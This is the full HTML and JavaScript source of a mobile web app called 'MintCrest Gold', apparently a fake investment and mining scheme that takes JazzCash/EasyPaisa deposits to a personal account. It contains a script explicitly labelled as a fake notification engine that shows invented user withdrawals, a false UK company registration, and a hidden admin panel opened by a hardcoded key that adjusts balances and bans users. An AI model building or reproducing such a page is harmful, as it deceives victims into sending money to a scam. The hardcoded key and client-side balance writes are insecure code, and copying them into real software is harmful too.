<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Official Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --accent: #3b82f6; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); padding-bottom: 100px; overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); }
        .page { display: none; animation: slideUp 0.4s ease forwards; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .btn-prime { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; border-radius: 16px; font-weight: 800; }
        #fake-notif { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 350px; z-index: 999999; background: var(--card); border: 1px solid var(--accent); transition: 0.5s; border-radius: 20px; }
        #fake-notif.show { top: 20px; }
        input, textarea, select { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 14px; border-radius: 14px; width: 100%; outline: none; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="fake-notif" class="p-4 flex items-center gap-4 shadow-2xl">
        <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-lg">💰</div>
        <div><p id="notif-user" class="text-[10px] font-black text-blue-500 uppercase">User****</p><p id="notif-msg" class="text-[9px] font-bold opacity-70">Just withdrew ₨ 5,000</p></div>
    </div>

    <header class="p-4 flex justify-between items-center sticky top-0 bg-[var(--bg)]/80 backdrop-blur-md border-b border-[var(--border)] z-[5000]">
        <div class="flex items-center gap-2">
            <div onclick="adminTap()" class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center font-black text-white italic cursor-pointer shadow-lg shadow-blue-500/20">M</div>
            <span class="font-black text-xs uppercase tracking-tighter">MintCrest <span class="text-blue-500">Gold</span></span>
        </div>
        <div id="top-bal" class="text-[10px] font-black bg-blue-600/10 text-blue-500 px-4 py-1.5 rounded-full border border-blue-500/20 italic">₨ 0</div>
    </header>

    <main id="app-ui" class="p-4 space-y-6">
        <div id="p-home" class="page active-page space-y-6">
            <div class="p-8 rounded-[2.5rem] bg-gradient-to-br from-blue-700 to-blue-900 text-white shadow-2xl relative">
                <p class="text-[10px] font-black uppercase opacity-60 tracking-widest">Active Liquidity</p>
                <h2 class="text-4xl font-black tracking-tighter" id="v-bal">₨ 0.00</h2>
                <button onclick="claimDaily()" class="mt-4 w-full bg-white/20 p-3 rounded-xl text-[9px] font-black uppercase backdrop-blur-md border border-white/10">🎁 Daily Bonus</button>
            </div>
            <div class="glass p-5 rounded-[2rem] flex gap-2">
                <input type="text" id="promo-input" placeholder="Promo Code" class="flex-1 !m-0 !p-3 uppercase">
                <button onclick="applyPromo()" class="btn-prime px-6 py-3 text-[9px] uppercase">Redeem</button>
            </div>
            <div id="plans-grid" class="grid grid-cols-1 gap-4 pb-20"></div>
        </div>

        <div id="p-deposit" class="page space-y-6">
            <h3 class="text-[10px] font-black uppercase text-center opacity-40 italic tracking-widest">Funding Node</h3>
            <div class="glass p-6 rounded-[2.5rem] space-y-4 text-center">
                <p class="text-[9px] font-bold text-blue-500 uppercase tracking-widest">Official Account Details</p>
                <div class="bg-blue-600/5 p-4 rounded-2xl border border-blue-500/10">
                    <p class="text-xs font-black">JazzCash/EasyPaisa</p>
                    <p class="text-xl font-black text-blue-500 mt-1">0300-XXXXXXX</p>
                    <p class="text-[8px] opacity-40 uppercase mt-1 italic">Name: Muhammad Nazim</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount (₨)">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <button onclick="sendDeposit()" class="w-full p-4 btn-prime text-[10px] uppercase tracking-widest">Submit Deposit ⚡</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-6">
            <h3 class="text-[10px] font-black uppercase text-center opacity-40 italic tracking-widest">Extraction Point</h3>
            <div class="glass p-6 rounded-[2.5rem] space-y-4">
                <input type="number" id="wit-amt" placeholder="Amount (₨)">
                <select id="wit-method">
                    <option value="JazzCash">JazzCash</option>
                    <option value="EasyPaisa">EasyPaisa</option>
                </select>
                <input type="text" id="wit-acc" placeholder="Account Number">
                <button onclick="sendWithdraw()" class="w-full p-4 btn-prime text-[10px] uppercase tracking-widest">Request Payout 💸</button>
            </div>
        </div>

        <div id="p-support" class="page space-y-6">
            <div class="glass p-6 rounded-[2.5rem] space-y-4">
                <p class="text-[9px] font-black uppercase text-blue-500 text-center">Contact Admin</p>
                <textarea id="support-msg" placeholder="Message..." rows="4"></textarea>
                <button onclick="sendSupport()" class="w-full p-4 btn-prime text-[10px] uppercase">Send Message</button>
            </div>
            <div class="glass p-6 rounded-[2.5rem] text-[10px] leading-relaxed opacity-70">
                <p class="font-black text-blue-500 uppercase">MintCrest Gold Ltd (UK)</p>
                <p>Registration: #UK-MCG-2026. Email: webhub262@gmail.com</p>
                <p class="mt-4">Privacy: All transactions are 256-bit encrypted. Withdrawal time: 2-24 hours.</p>
            </div>
        </div>
    </main>

    <nav class="fixed bottom-0 w-full glass border-t border-[var(--border)] p-4 flex justify-around items-center rounded-t-[2.5rem] z-[4000]">
        <button onclick="changePage('home')" class="flex flex-col items-center gap-1">🏠<span class="text-[7px] font-black">HOME</span></button>
        <button onclick="changePage('deposit')" class="flex flex-col items-center gap-1">➕<span class="text-[7px] font-black">DEPOSIT</span></button>
        <button onclick="changePage('withdraw')" class="flex flex-col items-center gap-1">💸<span class="text-[7px] font-black">WITHDRAW</span></button>
        <button onclick="changePage('support')" class="flex flex-col items-center gap-1">🛡️<span class="text-[7px] font-black">SUPPORT</span></button>
    </nav>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-4">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Control Panel</h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div class="glass p-6 rounded-3xl space-y-4 mb-6">
            <input type="text" id="adm-u-name" placeholder="Username">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="adjustUser('balance', 5000)" class="bg-green-600 p-3 rounded-xl text-[8px] font-black">ADD ₨ 5000</button>
                <button onclick="adjustUser('banned', true)" class="bg-red-600 p-3 rounded-xl text-[8px] font-black">BAN USER</button>
            </div>
            <input type="text" id="set-promo-code" placeholder="New Promo Code">
            <input type="number" id="set-promo-amt" placeholder="Promo Amount (₨)">
            <button onclick="updateSettings()" class="w-full btn-prime p-4 text-[10px] uppercase">Save Settings</button>
        </div>
        <div id="adm-msg-list" class="space-y-4"></div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let system = {}; let tapCount = 0;

        // FAKE NOTIF ENGINE
        setInterval(() => {
            const names = ["Zain", "Mehak", "Ali", "Sara", "Hamza", "Ayesha"];
            document.getElementById('notif-user').innerText = names[Math.floor(Math.random()*6)] + "****";
            document.getElementById('fake-notif').classList.add('show');
            setTimeout(() => document.getElementById('fake-notif').classList.remove('show'), 4000);
        }, 12000);

        function enterApp(n) {
            db.collection("users").doc(n).onSnapshot(d => {
                user = d.data();
                document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
                document.getElementById('top-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            });
            db.collection("settings").doc("system").onSnapshot(d => { system = d.data() || {}; });
            renderPlans();
        }

        // DEPOSIT LOGIC
        async function sendDeposit() {
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            if(!amt || !tid) return alert("Details enter karein! 😘");
            await db.collection("deposits").add({ user: user.name, amount: amt, tid: tid, time: Date.now(), status: "pending" });
            alert("Deposit request sent to admin! 😘");
        }

        // WITHDRAW LOGIC
        async function sendWithdraw() {
            const amt = document.getElementById('wit-amt').value;
            if(user.balance < amt) return alert("Low balance! 😘");
            await db.collection("withdraws").add({ user: user.name, amount: amt, method: document.getElementById('wit-method').value, acc: document.getElementById('wit-acc').value, time: Date.now(), status: "pending" });
            alert("Withdraw request submitted! 😘");
        }

        // MINING PLANS (Original 25)
        function renderPlans() {
            const grid = document.getElementById('plans-grid'); grid.innerHTML = '';
            for(let i=1; i<=25; i++) {
                let p = 500 + (i*1000);
                grid.innerHTML += `<div class="glass p-5 rounded-[2rem] border-l-4 border-blue-500 flex justify-between items-center">
                    <div><h4 class="font-black text-[10px] uppercase italic">Node v${i}</h4><p class="text-[9px] font-black text-blue-500">₨ ${p.toLocaleString()}</p></div>
                    <button class="btn-prime px-6 py-2 text-[8px] uppercase">Activate</button>
                </div>`;
            }
        }

        async function claimDaily() {
            const now = Date.now();
            if(user.lastDaily && (now - user.lastDaily < 86400000)) return alert("24 hours wait karein! 😘");
            await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(system.dailyBonusAmt || 10), lastDaily: now });
            alert("Daily Bonus Added! 😘");
        }

        async function applyPromo() {
            const c = document.getElementById('promo-input').value.toUpperCase();
            if(c === system.activePromoCode && (!user.usedPromos || !user.usedPromos.includes(c))) {
                await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(system.promoAmt || 50), usedPromos: firebase.firestore.FieldValue.arrayUnion(c) });
                alert("Promo Code Applied! 😘");
            } else { alert("Code invalid ya already used! 😘"); }
        }

        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncMessages(); } tapCount=0; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        window.onload = () => { if(localStorage.getItem('mc_user')) enterApp(localStorage.getItem('mc_user')); }
    </script>
</body>
</html>
